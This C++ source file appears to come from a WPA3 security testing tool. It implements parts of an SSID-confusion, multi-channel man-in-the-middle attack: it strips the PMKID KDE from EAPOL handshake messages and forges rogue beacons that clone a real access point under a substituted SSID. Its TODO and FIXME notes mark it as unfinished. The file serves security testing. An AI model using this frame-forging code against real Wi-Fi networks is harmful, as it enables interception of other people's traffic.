#include "attacks/mc_mitm/client_state.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "net_parser/eap_defs.h"
#include "net_parser/kde_defs.h"
namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;
//TODO test
// Strip PMKID KDE from EAPOL-Key msg1 key data (IEEE 802.11-2024, Sec.12.7.2, Fig 12-40).
// Msg1 Key MIC Present=0 -> key data is unprotected plaintext.
bool strip_pmkid_kde(frame_raw_t &raw) {
	using namespace eap;
	using namespace kde;
	static constexpr uint8_t snap_eapol[] = { ETHERTYPE_EAPOL_HI, ETHERTYPE_EAPOL_LO };
	const auto snap = ranges::search(raw, snap_eapol).begin();
	if(snap == raw.end()) return false;
	const size_t eapol_off = static_cast<size_t>(snap - raw.begin()) + 2;
	if(eapol_off + EAPOL_KEY_OFF_KD > raw.size()) return false;
	const size_t kdlen_off = eapol_off + EAPOL_KEY_OFF_KD_LEN;
	uint16_t kdlen = static_cast<uint16_t>(raw[kdlen_off]) << 8 | raw[kdlen_off + 1];
	if(kdlen < PMKID_KDE_SIZE || eapol_off + EAPOL_KEY_OFF_KD + kdlen > raw.size()) return false;
	static constexpr uint8_t pmkid_kde_hdr[] = {
		KDE_TYPE, PMKID_KDE_LEN, IEEE_OUI[0], IEEE_OUI[1], IEEE_OUI[2], KDE_PMKID
	};
	const auto kd_begin = raw.begin() + static_cast<ptrdiff_t>(eapol_off + EAPOL_KEY_OFF_KD);
	const auto kd_end   = kd_begin + kdlen;
	const auto kde_it   = std::search(kd_begin, kd_end, std::begin(pmkid_kde_hdr), std::end(pmkid_kde_hdr));
	if(kde_it == kd_end) return false;
	raw.erase(kde_it, kde_it + PMKID_KDE_SIZE);
	kdlen -= static_cast<uint16_t>(PMKID_KDE_SIZE);
	raw[kdlen_off]     = static_cast<uint8_t>(kdlen >> 8);
	raw[kdlen_off + 1] = static_cast<uint8_t>(kdlen);
	const size_t pktlen_off = eapol_off + EAPOL_LEN_OFF;
	uint16_t pktlen = (static_cast<uint16_t>(raw[pktlen_off]) << 8) | raw[pktlen_off + 1];
	pktlen -= static_cast<uint16_t>(PMKID_KDE_SIZE);
	raw[pktlen_off]     = static_cast<uint8_t>(pktlen >> 8);
	raw[pktlen_off + 1] = static_cast<uint8_t>(pktlen);
	return true;
}
unique_ptr<Dot11Beacon> SsidConfusion::make_confused_beacon(const Dot11Beacon &real,
	const HWAddress<6> &rogue_mac, const Channel &rogue_ch,
	const optional<string> &confused_ssid) {
	auto b = Dot11Beacon(real.addr1(), rogue_mac);
	b.addr3(rogue_mac);
	b.timestamp(real.timestamp());
	b.interval(real.interval());
	b.capabilities() = real.capabilities();
	const bool is_24ghz = (rogue_ch.band == WifiBand::BAND_2_4);
	// need to be reallocated because len can be changed
	for(const auto &opt: real.options()) {
		if(opt.option() == Dot11::SSID && confused_ssid) {
			b.add_option({ Dot11::SSID,
				static_cast<uint8_t>(confused_ssid->size()),
				reinterpret_cast<const uint8_t *>(confused_ssid->data()) });
		// VHT IEs are invalid on 2.4 GHz - drop them
		} else if(is_24ghz && (opt.option() == Dot11ManagementFrame::VHT_OP ||
		                       opt.option() == Dot11ManagementFrame::VHT_CAP)) {
		} else {
			b.add_option(opt);
		}
	}
	// ------ in place changes
	if(auto *ch_ie = b.search_option(Dot11ManagementFrame::DS_SET))
		const_cast<uint8_t *>(ch_ie->data_ptr())[0] = rogue_ch.ch_num;
	if(auto *ht_ie = b.search_option(Dot11ManagementFrame::HT_OPERATION)) {
		if(ht_ie->data_size() >= 1)
			const_cast<uint8_t *>(ht_ie->data_ptr())[0] = rogue_ch.ch_num;
	}
	//FIXME VHT_OPERATION on 5 GHz: center freq segments depend on channel width - needs lookup table
	// TIM bitmap 0xFF: signals pending traffic for all STAs -> keeping clients awake (on PS-Poll)
	//FIXME its only fallback? - not correct solution, but client will be awake for longer time
	if(auto *tim_ie = b.search_option(Dot11ManagementFrame::TIM)) {
		if(tim_ie->data_size() >= 4) {
			auto *data = const_cast<uint8_t *>(tim_ie->data_ptr());
			fill(data + 3, data + tim_ie->data_size(), uint8_t{0xFF});
		}
	}
	return make_unique<Dot11Beacon>(std::move(b));
}
}
